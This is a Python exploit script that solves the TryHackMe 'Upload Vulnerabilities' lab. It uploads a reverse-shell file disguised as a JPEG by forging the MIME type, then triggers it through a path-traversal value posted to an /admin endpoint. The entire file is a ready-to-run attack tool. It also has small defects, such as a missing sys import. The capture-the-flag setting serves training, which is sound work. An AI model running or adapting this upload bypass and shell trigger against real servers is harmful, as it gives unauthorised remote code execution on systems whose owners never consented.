#!/usr/bin/env python3
#------------------------------------------------------------
# Author: Thomas Osgood
#
# Description:
#
#   This script is designed to solve the 
#   "Upload Vulnerabilities" paid room on TryHackMe.
#
#   This script is designed to server two purposes:
#
#   First it can successfully upload a reverse shell onto the
#   target, bypassing the file upload filters/restrictions.
#   If no filename is provided, the program assumes there is
#   a filenamed "revshell" in the current directory that is
#   meant to be uploaded.
#
#   Second, it can activate the reverse shell and allow the
#   user to gain a foothold on the target device. To fire
#   off the reverse shell, the user must provide the name of
#   the uploaded file (what the server named it). To get the
#   filename, a Gobuster scan can be performed on the 
#   "/contents" directory of the target using the wordlist
#   provided in the challenge.
#
# Example Calls: (assume $TARGET=jewel.uploadvulns.thm)
#
#  python3 exploit.py $TARGET 80 upload
#
#  python3 exploit.py $TARGET 80 activate -f AAA.jpg
#------------------------------------------------------------

import argparse
import base64
import os
import platform
import requests

############################################################
# Global Variables
############################################################

ANSI_CLRLN = "\r\x1b[2K\r"
ANSI_RST = "\x1b[0m"
ANSI_GRN = "\x1b[32;1m"
ANSI_RED = "\x1b[31;1m"
ANSI_BLU = "\x1b[34;1m"
ANSI_YLW = "\x1b[33;1m"

HTTPS_ENABLED = False

class Uploader:
    def __init__(self,baseurl,filename=None):
        if not(isinstance(baseurl,str)):
            raise TypeError(f"Baseurl must be a string. Got {type(baseurl)}")
        elif len(baseurl) < 1:
            raise ValueError("Baseurl must be a non-zero length string.")
        elif baseurl[-1] == "/":
            baseurl = baseurl[:-1]

        if filename is None:
            filename = "revshell"
        elif not(isinstance(filename,str)):
            raise TypeError(f"Filename must be a string. Got {type(filename)}")
        elif len(filename) < 1:
            raise ValueError("Filename must be a non-zero length string.")

        self.__filename = filename
        self.__baseurl = baseurl
        self.__session = requests.Session()
        return

    def Upload(self):
        databytes = bytes()
        dataencoded = str()
        message = str()
        mimetype = "image/jpeg"
        payload = str()
        reqjson = dict()
        success = bool()
        targetroute = ""
        targeturl = str()

        try:
            targeturl = f"{self.__baseurl}/{targetroute}"

            #------------------------------------------------------------
            # read the bytes of the reverse shell file
            #
            # the file is read as bytes because it is assumed the
            # reverse shell file will not be a text file. reading the
            # file as bytes allows for both text and binary files to
            # be uploaded to the target.
            #------------------------------------------------------------
            with open(self.__filename,"rb") as fptr:
                databytes = fptr.read()

            #------------------------------------------------------------
            # file is passed to server from front-end as base64
            #
            # encode the bytes read from the reverse shell file so the
            # server will accept the upload.
            #------------------------------------------------------------
            dataencoded = base64.b64encode(databytes).decode()

            payload = f"data:application/octet-stream;base64,{dataencoded}"

            #------------------------------------------------------------
            # setup the POST JSON to send to the server
            #
            # the mimetype is manually set to "image/jpeg" to get around
            # the server's filter.
            #------------------------------------------------------------
            reqjson["name"] = "myfile.jpg"
            reqjson["type"] = mimetype
            reqjson["file"] = payload

            #------------------------------------------------------------
            # transmit payload to server and check for errors
            #------------------------------------------------------------
            resp = self.__session.post(targeturl,json=reqjson)
            if resp.status_code >= 400:
                raise ValueError(f"[upload] bad status code ({resp.status_code} {resp.reason})")
            elif resp.text.lower() != "success":
                raise ValueError("[upload] file failed to upload. check payload.")

            message = "file successfully uploaded to target"
            success = True
        except Exception as ex:
            message = str(ex)
            success = False

        return (success, message)

############################################################
# Formatting Functions
############################################################

def SucMsg(msg):
    print(f"{ANSI_CLRLN}[{ANSI_GRN}+{ANSI_RST}] {msg}")
    return

def ErrMsg(msg):
    print(f"{ANSI_CLRLN}[{ANSI_RED}-{ANSI_RST}] {msg}")
    return

def InfoMsg(msg):
    print(f"{ANSI_CLRLN}[{ANSI_BLU}i{ANSI_RST}] {msg}")
    return

def InfoMsgNB(msg):
    print(f"{ANSI_CLRLN}[{ANSI_BLU}i{ANSI_RST}] {msg}", end="")
    return

def SysMsg(msg):
    print(f"{ANSI_CLRLN}[{ANSI_YLW}*{ANSI_RST}] {msg}")
    return

def SysMsgNB(msg):
    print(f"{ANSI_CLRLN}[{ANSI_YLW}*{ANSI_RST}] {msg}", end="")
    return

############################################################
# Validation Functions
############################################################

def port_type(portno):
    portno = int(portno)

    if (portno < 1) or (portno > 65535):
        raise argparse.ArgumentError("Port must be within range 1 - 65535.")

    return portno

############################################################

def RunShell(baseurl,filename,timeout=None):
    bodydata = dict()
    message = str()
    payload = str()
    success = bool()
    targetroute = "admin"
    targeturl = str()

    try:
        if not(isinstance(baseurl,str)):
            raise TypeError(f"Baseurl must be a string. Got {type(baseurl)}")
        elif len(baseurl) < 1:
            raise ValueError("Baseurl must be a non-zero length string.")
        elif baseurl[-1] == "/":
            baseurl = baseurl[:-1]

        if not(isinstance(filename, str)):
            raise TypeError(f"Filename must be a string. Got {type(filename)}")
        elif len(filename) < 1:
            raise ValueError("Filename must be a non-zero length string")

        if timeout is None:
            timeout = 10
        elif not(isinstance(timeout,int)):
            raise TypeError(f"Timeout must be an int. Got {type(timeout)}")
        elif timeout <= 0:
            raise ValueError("Timeout must be > 0")
        
        targeturl = f"{baseurl}/{targetroute}"
        payload = f"../content/{filename}"
        bodydata["cmd"] = payload

        resp = requests.post(targeturl, data=bodydata, timeout=timeout)
        if resp.status_code >= 400:
            raise ValueError(f"[execute] bad status code ({resp.status_code} {resp.reason})")

        if "module does not exist" in resp.text:
            raise ValueError(f"[execute] file \"{filename}\" not found on target.")

        message = "shell successfully executed"
        success = True
    except requests.exceptions.ReadTimeout:
        message = "timeout encountered. check for shell"
        success = True
    except Exception as ex:
        message = str(ex)
        success = False

    return (success, message)

def main():
    actions = ["activate", "upload"]
    scheme = str()

    if platform.system().lower() == "windows":
        os.system("")
    
    parser = argparse.ArgumentParser()

    ############################################################
    # Setup required command-line arguments.
    ############################################################
    parser.add_argument("target", help="IP address of target.", type=str)
    parser.add_argument("port", help="Port to connect to target on.", type=port_type)
    parser.add_argument("action", help="Action to execute on target.", choices=actions, type=str)

    parser.add_argument("-f", "--filename", help="filename to use in action.", type=str, dest="filename")
    parser.add_argument("--secure", help="use HTTPS scheme", action="store_true", dest="secure")

    args = parser.parse_args()

    action = args.action
    target = args.target
    port = args.port
    secure = args.secure

    filename = args.filename

    ############################################################
    # Set HTTP scheme (HTTP or HTTPS) based on arguments.
    ############################################################
    if secure:
        scheme = "https"
    else:
        scheme = "http"

    print(f"{ANSI_RED}{'='*60}{ANSI_RST}")
    print(f"{ANSI_GRN}{'Target Information':^60}{ANSI_RST}")
    print(f"{ANSI_RED}{'='*60}{ANSI_RST}")
    InfoMsg(f"Target IP: {target}")
    InfoMsg(f"Target Port: {port}")
    InfoMsg(f"Scheme: {scheme}")
    print(f"{ANSI_RED}{'='*60}{ANSI_RST}")

    baseURL = f"{scheme}://{target}:{port}"

    try:


        if action == "upload":
            attacker = Uploader(baseURL, filename)
            success, message = attacker.Upload()
            if not(success):
                raise ValueError(message)
            SucMsg(message)
        else:
            if (len(filename) < 1):
                raise ValueError("Filename cannot be black when attempting to activate shell")

            success, message = RunShell(baseURL, filename)
            if not(success):
                raise ValueError(message)
            SucMsg(message)
    except Exception as ex:
        ErrMsg(str(ex))
        sys.exit(1)

    return

if __name__ == "__main__":
    main()

